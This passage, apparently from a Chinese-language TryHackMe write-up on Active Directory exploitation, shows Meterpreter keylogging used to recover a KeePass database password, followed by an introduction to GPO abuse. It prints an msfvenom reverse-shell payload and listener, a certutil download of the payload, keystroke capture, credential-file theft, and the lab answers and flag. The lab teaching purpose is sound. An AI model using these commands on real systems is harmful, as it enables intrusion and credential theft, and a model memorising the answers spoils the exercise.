\u4e2d\uff0c\u8fd9\u975e\u5e38\u91cd\u8981\uff0c\u56e0\u4e3a\u7528\u6237\u53ef\u80fd\u6709\u591a\u5957\u51ed\u8bc1\uff0c\u8bb0\u4f4f\u5b83\u4eec\u53ef\u80fd\u5f88\u9ebb\u70e6\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u952e\u76d8\u8bb0\u5f55 - \u5728\u5229\u7528\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u7ecf\u5e38\u9700\u8981\u4e86\u89e3\u666e\u901a\u7528\u6237\u5982\u4f55\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u3002\u4e0e\u5c4f\u5e55\u622a\u56fe\u4e00\u8d77\uff0c\u952e\u76d8\u8bb0\u5f55\u53ef\u4ee5\u662f\u4ece\u653b\u51fb\u8005\u89d2\u5ea6\u83b7\u53d6\u8fd9\u79cd\u7406\u89e3\u7684\u6709\u7528\u5de5\u5177\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"\u5bfb\u627e\u51ed\u8bc1",children:"\u5bfb\u627e\u51ed\u8bc1"}),"\n",(0,r.jsx)(n.p,{children:"\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u5165\u4fb5\u4e86 THMSERVER1\uff0c\u6216\u8bb8\u5e94\u8be5\u56db\u5904\u770b\u770b\u662f\u5426\u6709\u4efb\u4f55\u6709\u7528\u7684\u4fe1\u606f\u3002\u67e5\u770b\u7528\u6237\u76ee\u5f55\uff0c\u770b\u770b\u662f\u5426\u6709\u4e00\u4e9b\u6709\u7528\u7684\u5185\u5bb9\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u4f60\u7684\u679a\u4e3e\u5de5\u4f5c\u5e94\u8be5\u4f1a\u5bfc\u81f4\u4e00\u4e2a. kdbx \u6587\u4ef6\u3002\u5feb\u901f\u641c\u7d22\u4e00\u4e0b\u53ef\u4ee5\u786e\u8ba4\u6211\u4eec\u7684\u6000\u7591\uff0c\u8fd9\u4e2a\u6587\u4ef6\u786e\u5b9e\u975e\u5e38\u6709\u4ef7\u503c\uff01\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Meterpreter \u7684\u4e0b\u8f7d\u547d\u4ee4\u6765\u6062\u590d\u8fd9\u4e2a\u6587\u4ef6\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u4e2a\u6587\u4ef6\u4f3c\u4e4e\u662f\u4e00\u4e2a\u51ed\u8bc1\u6570\u636e\u5e93\u3002\u7136\u800c\uff0c\u95ee\u9898\u5728\u4e8e\u6570\u636e\u5e93\u88ab\u5bc6\u7801\u52a0\u5bc6\u4e86\u3002\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u7834\u89e3\u5bc6\u7801\uff0c\u4f46\u901a\u5e38\u4f7f\u7528\u51ed\u8bc1\u6570\u636e\u5e93\u7684\u4eba\u4f1a\u786e\u4fdd\u521d\u59cb\u5bc6\u7801\u662f\u5b89\u5168\u7684\u3002\u6211\u4eec\u4e5f\u8bb8\u66f4\u6709\u6210\u529f\u7684\u673a\u4f1a\u662f\u770b\u770b\u7528\u6237\u662f\u5982\u4f55\u4e0e\u8fd9\u4e2a\u6570\u636e\u5e93\u8fdb\u884c\u4ea4\u4e92\u7684\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"system-\u6709\u65f6\u7279\u6743\u592a\u9ad8",children:"SYSTEM \u6709\u65f6\u7279\u6743\u592a\u9ad8"}),"\n",(0,r.jsx)(n.p,{children:"Meterpreter \u5177\u6709\u5185\u7f6e\u7684\u952e\u76d8\u8bb0\u5f55\u5668\u3002\u8fd9\u5bf9\u63d0\u53d6\u7528\u6237\u7684\u51fb\u952e\u4fe1\u606f\u5f88\u6709\u7528\u3002\u4f46\u662f\uff0c\u6211\u4eec\u4e0d\u80fd\u968f\u4fbf\u542f\u52a8\u8fd9\u4e2a\u952e\u76d8\u8bb0\u5f55\u5668\u7136\u540e\u671f\u5f85\u6700\u597d\u7684\u7ed3\u679c\uff0c\u56e0\u4e3a\u6211\u4eec\u7684 Shell \u5f53\u524d\u662f\u5728 SYSTEM \u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\u7684\u3002SYSTEM \u4e0d\u4f1a\u8f93\u5165\u4efb\u4f55\u6309\u952e\uff0c\u6240\u4ee5\u8fd9\u5bf9\u6211\u4eec\u6ca1\u6709\u5e2e\u52a9\u3002\u4e3a\u4e86\u6355\u83b7\u6b63\u786e\u7528\u6237\u7684\u51ed\u8bc1\uff0c\u6211\u4eec\u9700\u8981\u786e\u4fdd\u6211\u4eec\u7684 Shell \u662f\u4ee5\u8be5\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u8fd0\u884c\u7684\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u5e78\u8fd0\u7684\u662f\uff0cMeterpreter \u63d0\u4f9b\u4e86\u8fc1\u79fb\u529f\u80fd\uff0c\u56e0\u4e3a\u6211\u4eec\u662f\u4ee5 SYSTEM \u8eab\u4efd\u8fd0\u884c\u7684\uff0c\u6211\u4eec\u5e94\u8be5\u80fd\u591f\u8fc1\u79fb\u5230\u4efb\u4f55\u8fdb\u7a0b\u3002\u4f60\u5728 THMSERVER1 \u4e0a\u5177\u6709\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6743\u9650\uff0c\u5229\u7528\u8fd9\u4e2a\u6765\u83b7\u53d6\u4e00\u4e2a Meterpreter Shell\u3002\u5982\u679c\u4f60\u9700\u8981\u5173\u4e8e\u5982\u4f55\u4f7f\u7528 Meterpreter \u548c Metasploit \u7684\u590d\u4e60\uff0c\u8fd9\u91cc\u6709\u4e00\u4e2a\u5173\u4e8e\u5b83\u4f7f\u7528\u7684\u6a21\u5757\u3002\u4e0d\u8fc7\uff0c\u4e3a\u4e86\u5feb\u901f\u4e86\u89e3\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u751f\u6210\u4e00\u4e2a PowerShell Meterpreter \u8f7d\u8377\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u63a5\u4e0b\u6765\uff0c\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5728 msfconsole \u4e2d\u521b\u5efa\u76f8\u5173\u7684\u76d1\u542c\u5668\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"sudo msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT'listening port'; exploit\"\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u4f60\u53ef\u4ee5\u4f7f\u7528 Python \u7684 Web \u670d\u52a1\u5668\u6765\u6258\u7ba1\u4f60\u7684 Meterpreter Shell\uff0c\u7136\u540e\u4f7f\u7528\u7c7b\u4f3c\u4ee5\u4e0b\u7684\u65b9\u5f0f\u8fdb\u884c\u590d\u5236\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"certutil.exe -urlcache -split -f http:///shell.ps1\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u4e00\u65e6\u4f60\u62e5\u6709\u4e86 Meterpreter Shell\uff0c\u4f60\u53ef\u4ee5\u7ee7\u7eed\u3002\u7b2c\u4e00\u6b65\u662f\u67e5\u770b\u8fd9\u53f0\u673a\u5668\u4e0a\u7528\u6237\u662f\u5426\u6709\u8fd0\u884c\u7684\u8fdb\u7a0b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Terminal"',children:"meterpreter\\>ps | grep \"explorer\"\nFiltering on 'explorer'\n\nProcess List\n============\n\n PID   PPID  Name          Arch  Session  User                     Path\n ---   ----  ----          ----  -------  ----                     ----\n 3612  3592  explorer.exe  x64   1        THMSERVER1\\trevor.local  C:\\Windows\\explorer.exe\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5982\u679c\u4f60\u5728 trevor.local \u7528\u6237\u4e0b\u6ca1\u6709\u770b\u5230 explorer.exe \u8fdb\u7a0b\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u6b65\u9aa4\u81ea\u884c\u542f\u52a8\u8fd9\u4e2a\u8fdb\u7a0b\uff1a"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u91cd\u7f6e trevor.local \u7528\u6237\u7684\u5bc6\u7801\uff1a",(0,r.jsx)(n.code,{children:"net user trevor.local <password>"})]}),"\n",(0,r.jsxs)(n.li,{children:["\u5728 PowerShell \u4e2d\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a",(0,r.jsx)(n.code,{children:"C:\\auto-login.ps1 trevor.local <password> THMSERVER1"})]}),"\n",(0,r.jsxs)(n.li,{children:["\u4f7f\u7528 ",(0,r.jsx)(n.code,{children:"shutdown -r"})," \u91cd\u542f\u670d\u52a1\u5668"]}),"\n",(0,r.jsx)(n.li,{children:"\u670d\u52a1\u5668\u91cd\u65b0\u4e0a\u7ebf\u540e\uff0c\u4f60\u5e94\u8be5\u80fd\u770b\u5230 explorer \u8fdb\u7a0b\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u770b\u8d77\u6765\u6211\u4eec\u5f88\u5e78\u8fd0\uff01\u7528\u6237\u5728 THMSERVER1 \u4e0a\u6709\u4e00\u4e2a\u6d3b\u52a8\u4f1a\u8bdd\u3002\u8ba9\u6211\u4eec\u8fc1\u79fb\u5230\u8fd9\u4e2a\u7528\u6237\u7684\u67d0\u4e2a\u8fdb\u7a0b\u3002\u901a\u5e38\uff0c\u6700\u5b89\u5168\u7684\u9009\u62e9\u662f\u50cf explorer.exe \u8fd9\u6837\u7684\u8fdb\u7a0b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Terminal"',children:"meterpreter\\>migrate 3612\n[*] Migrating from 4408 to 3612...\n[*] Migration completed successfully.\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 getuid \u547d\u4ee4\u786e\u8ba4\u6211\u4eec\u73b0\u5728\u6b63\u5728\u4ee5\u76ee\u6807\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Terminal"',children:"meterpreter\\>getuid\nServer username: THMSERVER1\\trevor.local\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u73b0\u5728\u6211\u4eec\u9700\u8981\u8010\u5fc3\u7b49\u5f85\u3002\u5982\u679c\u5e78\u8fd0\u7684\u8bdd\uff0c\u6211\u4eec\u5c06\u6355\u83b7\u4e00\u4e9b\u51ed\u636e\uff01\u7b49\u5f85\u51e0\u5206\u949f\uff0c\u7136\u540e\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u6765\u8f6c\u50a8\u6355\u83b7\u7684\u6309\u952e\u8bb0\u5f55\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Terminal"',children:"meterpreter\\>keyscan_dump\nDumping captured keystrokes...\nkeep<CR>\n<Shift>Passwordpasswordpassword<CR>\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u662f\u9488\u5bf9 AD \u7528\u6237\u7684\u4e00\u4e2a\u7b80\u5355\u793a\u4f8b\u3002\u8fd8\u6709\u8bb8\u591a\u5176\u4ed6\u5de5\u4f5c\u53ef\u4ee5\u505a\u3002\u5728\u4f60\u7684 AD \u5229\u7528\u65b9\u6cd5\u8bba\u4e2d\u5305\u542b\u7528\u6237\u5b9a\u4f4d\u975e\u5e38\u91cd\u8981\u3002\u4e3a\u4e86\u56de\u7b54\u8fd9\u4e2a\u4efb\u52a1\u7684\u95ee\u9898\uff0c\u4f60\u5c06\u9700\u8981\u4f7f\u7528 Keepass\u3002\u5b83\u5df2\u7ecf\u5728 AttackBox \u4e0a\u4e3a\u4f60\u5b89\u88c5\u597d\u4e86\uff0c\u6240\u4ee5\u4f60\u53ea\u9700\u641c\u7d22\u5e76\u8fd0\u884c\u8be5\u5e94\u7528\u7a0b\u5e8f\u3002\u5982\u679c\u4f60\u4f7f\u7528\u7684\u662f\u81ea\u5df1\u7684\u865a\u62df\u673a\uff0c\u5728\u5927\u591a\u6570 Linux \u53d1\u884c\u7248\u4e0a\uff0csudo apt install keepassx \u5e94\u8be5\u53ef\u4ee5\u5de5\u4f5c\u3002\u6216\u8005\u4f60\u4e5f\u53ef\u4ee5\u4ece\u8fd9\u91cc\u4e0b\u8f7d\u3002\u53e6\u5916\uff0c\u8bf7\u786e\u4fdd\u4f7f\u7528 meterpreter \u7684\u4e0b\u8f7d\u547d\u4ee4\u5c06 Keepass \u6570\u636e\u5e93\u4e0b\u8f7d\u5230\u4f60\u7684\u4e3b\u673a\u4e0a\u3002\u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528 Kali\uff0c\u8bf7\u786e\u4fdd kali \u7528\u6237\u62e5\u6709\u6570\u636e\u5e93\u6587\u4ef6\uff0c\u7136\u540e\u518d\u6253\u5f00\u5b83\uff0c\u5426\u5219\u5b83\u53ef\u80fd\u4f1a\u9501\u5b9a\u6570\u636e\u5e93\u5e76\u7ed9\u51fa\u9519\u8bef\u7684\u7ed3\u679c\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u867d\u7136\u6301\u4e45\u6027\u53ea\u4f1a\u5728\u4e0b\u4e00\u4e2a\u73af\u8282\u4e2d\u8ba8\u8bba\uff0c\u4f46\u73b0\u5728\u53ef\u80fd\u662f\u521b\u5efa THMSERVER1 \u4e0a\u7684\u4e00\u4e2a\u672c\u5730\u8d26\u6237\u5e76\u6388\u4e88\u7ba1\u7406\u5458\u6743\u9650\u7684\u597d\u65f6\u673a\uff0c\u8fd9\u6837\u4f60\u5c31\u6709\u4e86\u4e00\u4e2a\u826f\u597d\u7684\u7acb\u8db3\u70b9\u3002\u7531\u4e8e\u8fd9\u5bf9\u4e8e\u63a5\u4e0b\u6765\u7684\u4efb\u52a1\u5e76\u4e0d\u662f\u771f\u6b63\u9700\u8981\u7684\uff0c\u5982\u679c\u4f60\u60f3\u8fd9\u6837\u505a\uff0c\u4f60\u9700\u8981\u81ea\u5df1\u8fdb\u884c\u4e00\u4e9b\u7814\u7a76\u3002"}),"\n",(0,r.jsxs)(n.admonition,{title:"Answer the questions below",type:"info",children:[(0,r.jsx)(n.p,{children:"\u4f7f\u7528\u4ec0\u4e48\u5e94\u7528\u7a0b\u5e8f\u6253\u5f00 kdbx \u51ed\u8bc1\u6570\u636e\u5e93\uff1f"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Keepass\n"})}),(0,r.jsx)(n.p,{children:"\u6211\u4eec\u4f7f\u7528\u4ec0\u4e48 meterpreter \u547d\u4ee4\u4ece\u7cfb\u7edf\u4e0a\u4e0b\u6587\u79fb\u52a8\u5230\u7528\u6237\u4e0a\u4e0b\u6587\uff1f"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"migrate\n"})}),(0,r.jsx)(n.p,{children:"\u51ed\u8bc1\u6570\u636e\u5e93\u7684\u5bc6\u7801\u662f\u4ec0\u4e48\uff1f"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Imreallysurenoonewillguessmypassword\n"})}),(0,r.jsx)(n.p,{children:"\u51ed\u8bc1\u6570\u636e\u5e93\u4e2d\u5b58\u50a8\u7684\u6807\u5fd7\u7684\u503c\u662f\u591a\u5c11\uff1f"}),(0,r.jsxs)(t,{children:[(0,r.jsx)("summary",{children:" \u5177\u4f53\u64cd\u4f5c\u6b65\u9aa4 "}),(0,r.jsx)(n.p,{children:"\u633a\u91cd\u8981\u7684\u4e00\u70b9\uff0c\u5c31\u662f\u52a0\u5bc6\u6570\u636e\u5e93\u4f4d\u4e8e\uff1a"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"C:\\Users\\trevor.local\\Documents\\PasswordDatabase.kdbx\n"})}),(0,r.jsx)(n.p,{children:"\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 msfconsole \u4e0b\u8f7d\u4e0b\u6765\uff0c\u7136\u540e\u5728\u672c\u5730\u8fdb\u884c\u89e3\u5bc6"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"(Meterpreter 1)(C:\\Users\\trevor.local\\Documents) > download PasswordDatabase.kdbx\n[*] Downloading: PasswordDatabase.kdbx -> /home/randark/PasswordDatabase.kdbx\n[*] Downloaded 2.14 KiB of 2.14 KiB (100.0%): PasswordDatabase.kdbx -> /home/randark/PasswordDatabase.kdbx\n[*] Completed  : PasswordDatabase.kdbx -> /home/randark/PasswordDatabase.kdbx\n"})}),(0,r.jsx)("div",{style:{textAlign:"center"},children:(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"keepassx \u89e3\u5bc6\u7ed3\u679c",src:i(7993).Z+"",width:"1003",height:"652"})})})]}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"THM{AD.Users.Can.Give.Up.Good.Secrets}\n"})})]}),"\n",(0,r.jsx)(n.h2,{id:"exploiting-gpos---\u5229\u7528-gpos",children:"Exploiting GPOs - \u5229\u7528 GPOs"}),"\n",(0,r.jsx)(n.p,{children:"\u6293\u53d6\u7528\u6237\u7684\u6309\u952e\u8bb0\u5f55\u4f7f\u6211\u4eec\u80fd\u591f\u89e3\u5bc6\u4ed6\u4eec\u7684\u51ed\u8bc1\u6570\u636e\u5e93\uff0c\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u53ef\u4ee5\u7528\u4e8e\u8fdb\u4e00\u6b65\u8fdb\u884c AD \u5229\u7528\u7684\u51ed\u8bc1\uff0c\u7279\u522b\u662f svcServMan \u8d26\u6237\u3002\u6211\u4eec\u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u679a\u4e3e\u6765\u5f04\u6e05\u695a\u8fd9\u4e9b\u51ed\u8bc1\u5c06\u5bf9\u6211\u4eec\u6709\u4ec0\u4e48\u7528\u3002\u5e78\u8fd0\u7684\u662f\uff0c\u6211\u4eec\u5df2\u7ecf\u6709\u4e86\u53ef\u4ee5\u4f7f\u7528\u7684 Sharphound \u6570\u636e\u3002\u4f7f\u7528 Bloodhound \u4e2d\u7684\u641c\u7d22\u529f\u80fd\uff0c\u8ba9\u6211\u4eec\u67e5\u770b\u5df2\u53d1\u73b0\u8d26\u6237\u7684\u6743\u9650\uff1a"}),"\n",(0,r.jsx)("div",{style:{textAlign:"center"},children:(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Bloodhound \u5df2\u6709\u5e10\u6237\u7684\u6743\u9650",src:i(6646).Z+"",width:"1164",height:"671"})})}),"\n",(0,r.jsx)(n.p,{children:"\u7279\u522b\u7a81\u51fa\u7684\u662f\u8fd9\u4e2a\u8d26\u6237\u62e5\u6709\u4e00\u4e2a\u6743\u9650\uff0c\u5373\u5bf9\u4e00\u4e2a\u7ec4\u7b56\u7565\u5bf9\u8c61\uff08GPO\uff09\u7684\u6240\u6709\u6743\u3002\u6b64\u5916\uff0c\u5f53\u6211\u4eec\u8fdb\u884c\u4e00\u4e9b\u8c03\u67e5\u65f6\uff0c\u4f3c\u4e4e\u8fd9\u4e2a GPO \u88ab\u5e94\u7528\u5230\u4e86\u6211\u4eec\u7684 THMSERVER2 \u673a\u5668\u4e0a\uff1a"}),"\n",(0,r.jsx)("div",{style:{textAlign:"center"},children:(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Bloodhound \u5df2\u6709\u5e10\u6237 GPO",src:i(7260).Z+"",width:"1164",height:"305"})})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u53ef\u80fd\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u8fdb\u4e00\u6b65\u8fdb\u884c AD \u5229\u7528\u7684\u7406\u60f3\u673a\u4f1a\uff01"}),"\n",(0,r.jsx)(n.h3,{id:"\u7ec4\u7b56\u7565\u5bf9\u8c61",children:"\u7ec4\u7b56\u7565\u5bf9\u8c61"}),"\n",(0,r.jsx)(n.p,{children:"\u8bb0\u5f97\u6211\u4eec\u5728\u679a\u4e3e AD \u65f6\u8ba8\u8bba\u8fc7 SYSVOL \u76ee\u5f55\u5417\uff1f\u8fd9\u4e2a\u76ee\u5f55\u662f\u5b58\u50a8 AD GPO\uff08\u7ec4\u7b56\u7565\u5bf9\u8c61\uff09\uff0c\u4ee5\u4fbf\u590d\u5236\u5230\u52a0\u5165\u57df\u7684\u8ba1\u7b97\u673a\u4e0a\u7684\u5730\u65b9\u3002GPO \u662f\u4e00\u7ec4\u7b56\u7565\u8bbe\u7f6e\u3002\u6bcf\u4e2a GPO \u90fd\u6709\u4e00\u4e2a\u552f\u4e00\u7684\u540d\u79f0\uff0c\u79f0\u4e3a GUID\u3002\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u5982\u679c\u4f60\u8bd5\u56fe\u8bfb\u53d6 SYSVOL \u76ee\u5f55\u7684\u5185\u5bb9\uff0c\u7528\u6240\u6709\u8fd9\u4e9b\u968f\u673a\u540d\u79f0\u770b\u8d77\u6765\u6beb\u65e0\u610f\u4e49\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u6bcf\u53f0 Windows \u8ba1\u7b97\u673a\u90fd\u6709\u672c\u5730\u7b56\u7565\u914d\u7f6e\u3002\u5176\u4e2d\u5305\u542b\u4e86\u4e00\u4e9b\u503c\u5f97\u6ce8\u610f\u7684\u914d\u7f6e\uff0c\u6bd4\u5982\uff1a"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"\u670d\u52a1\u7684\u5e94\u7528\u914d\u7f6e\uff0c\u5982\u9632\u706b\u5899\u3001\u9632\u75c5\u6bd2\u8f6f\u4ef6\u548c Applocker\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u672c\u5730\u7ec4\u6210\u5458\uff0c\u6bd4\u5982\u7ba1\u7406\u5458\u6216\u8fdc\u7a0b\u684c\u9762\u7528\u6237\u7ec4\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u542f\u52a8\u914d\u7f6e\uff0c\u5982\u5e94\u8be5\u6267\u884c\u7684\u811a\u672c\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u5b89\u5168\u548c\u534f\u8bae\u8bbe\u7f6e\uff0c\u5982 SMBv1 \u652f\u6301\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u4e9b\u53ea\u662f\u4e00\u4e9b\u4f8b\u5b50\u3002\u53ef\u4ee5\u8bbe\u7f6e\u7684\u914d\u7f6e\u9009\u9879\u6709\u5f88\u591a\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"\u7ec4\u7b56\u7565\u7ba1\u7406",children:"\u7ec4\u7b56\u7565\u7ba1\u7406"}),"\n",(0,r.jsx)(n.p,{children:"\u5982\u679c\u4f60\u53ea\u6709\u4e00\u53f0 Windows \u8ba1\u7b97\u673a\uff0c\u76f4\u63a5\u5728\u4e3b\u673a\u4e0a\u66f4\u6539\u672c\u5730\u7b56\u7565\u914d\u7f6e\u5f88\u5bb9\u6613\u3002\u7136\u800c\uff0c\u5728\u5927\u578b\u7ec4\u7ec7\u4e2d\uff0c\u4f60\u9700\u8981\u4e00\u79cd\u673a\u5236\u4ece\u4e2d\u592e\u4f4d\u7f6e\u90e8\u7f72\u914d\u7f6e\u3002\u8fd9\u5c31\u662f\u7fa4\u7ec4\u7b56\u7565\u7ba1\u7406\uff08GPM\uff09\u53d1\u6325\u4f5c\u7528\u7684\u5730\u65b9\u3002\u4e0e\u5728\u6bcf\u53f0\u673a\u5668\u4e0a\u672c\u5730\u5b9a\u4e49\u7b56\u7565\u4e0d\u540c\uff0cGPM \u5141\u8bb8\u6211\u4eec\u76f4\u63a5\u5728 AD \u7ed3\u6784\u4e2d\u5b9a\u4e49\u7b56\u7565\u3002\u57fa\u672c\u4e0a\uff0c\u6211\u4eec\u53ef\u4ee5\u4e3a AD \u5bf9\u8c61\uff08\u6bd4\u5982\u7279\u5b9a OU \u6216\u7ec4\uff09\u5b9a\u4e49 GPO\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u52a0\u5165\u57df\u7684\u8ba1\u7b97\u673a\u4f1a\u5b9a\u671f\u4ece SYSVOL \u62c9\u53d6\u6240\u6709\u7b56\u7565\uff0c\u5e76\u5e94\u7528\u76f8\u5173\u7684\u7b56\u7565\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u7b56\u7565\u6bcf 15 \u5206\u949f\u901a\u8fc7 gpupdate \u5e94\u7528\u7a0b\u5e8f\u8fdb\u884c\u590d\u5236\u3002\u7136\u800c\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4ece\u547d\u4ee4\u63d0\u793a\u7b26\u624b\u52a8\u6267\u884c\u8fd9\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff0c\u7acb\u5373\u5e94\u7528\u7b56\u7565\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"\u5229\u7528-gpos",children:"\u5229\u7528 GPOs"}),"\n",(0,r.jsx)(n.p,{children:"\u867d\u7136\u6709\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u5229\u7528 GPOs\uff0c\u4f46\u6211\u4eec\u5c06\u575a\u6301\u4f7f\u7528\u4e00\u4e2a\u7b80\u5355\u7684\u89e3\u51b3\u65b9\u6848\uff1a\u5c06\u6211\u4eec\u63a7\u5236\u7684 AD \u8d26\u6237\u6dfb\u52a0\u5230\u672c\u5730 Administrators \u548c Remote Desktop Users \u7ec4\u3002\u8fd9\u5c06\u5141\u8bb8\u6211\u4eec\u5728 THMSERVER2 \u4e0a\u62e5\u6709\u7ba1\u7406\u5458\u7279\u6743\u5e76\u80fd\u591f\u8fdb\u884c\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5\u3002\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528\u66b4\u9732\u7684 SSH \u7aef\u53e3\uff0c\u4f46\u5e76\u4e0d\u662f\u5f88\u591a\u7ec4\u7ec7\u90fd\u5347\u7ea7\u5230\u63d0\u4f9b SSH \u8bbf\u95ee\u3002\u56e0\u6b64\uff0cRDP \u8bbf\u95ee\u6216\u4f20\u7edf\u7684\u6a2a\u5411\u79fb\u52a8\u6280\u672f\u5982 SMBExec \u66f4\u5b89\u5168\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u4e3a\u4e86\u4fee\u6539 GPO\uff0c\u6211\u4eec\u9700\u8981\u4f5c\u4e3a\u62e5\u6709\u76f8\u5173\u6743\u9650\u7684 AD \u7528\u6237\u8bbf\u95ee\u7fa4\u7ec4\u7b56\u7565\u7ba1\u7406\u3002\u6211\u4eec\u53ef\u4ee5\u4f5c\u4e3a\u8be5\u7528\u6237\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5\u5230 THMSERVER1\uff0c\u4f46\u8fd9\u53ef\u80fd\u4f1a\u5c06\u7528\u6237\u8e22\u51fa\u4ed6\u4eec\u7684\u6d3b\u52a8\u4f1a\u8bdd\uff0c\u5f15\u8d77\u6000\u7591\u3002\u76f8\u53cd\uff0c\u6211\u4eec\u5c06\u4f7f\u7528\u6211\u4eec\u666e\u901a\u7684\u6216 Tier 2 \u7ba1\u7406\u5458\u8d26\u6237\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5\u5230 THMWRK1\uff0c\u4f7f\u7528 runas \u547d\u4ee4\u5c06 AD \u7528\u6237\u7684\u51ed\u636e\u6ce8\u5165\u5185\u5b58\uff0c\u5e76\u6253\u5f00 MMC \u6765\u4fee\u6539 GPO\u3002\u5173\u4e8e runas \u547d\u4ee4\u7684\u56de\u987e\uff0c\u8bf7\u53c2\u8003\u679a\u4e3e AD \u623f\u95f4\uff1b\u7136\u800c\uff0c\u4ee5\u4e0b\u63d0\u4f9b\u7684\u547d\u4ee4\u4e5f\u5e94\u8be5\u4ece\u7ba1\u7406\u5458\u547d\u4ee4\u63d0\u793a\u7b26\u7a97\u53e3\u6267\u884c\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Command Prompt"',children:"C:\\>runas /netonly /user:za.tryhackme.loc\\<AD Username> cmd.exe\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u4e00\u65e6\u63d0\u793a\uff0c\u8bf7\u63d0\u4f9b\u4e0e\u8be5\u8d26\u6237\u5173\u8054\u7684\u5bc6\u7801\u3002\u8981\u9a8c\u8bc1\u60a8\u63d0\u4f9b\u4e86\u6b63\u786e\u7684\u51ed\u636e\uff0c\u60a8\u53ef\u4ee5\u8fd0\u884c ",(0,r.jsx)(n.code,{children:"dir \\\\za.tryhackme.loc\\sysvol"})," 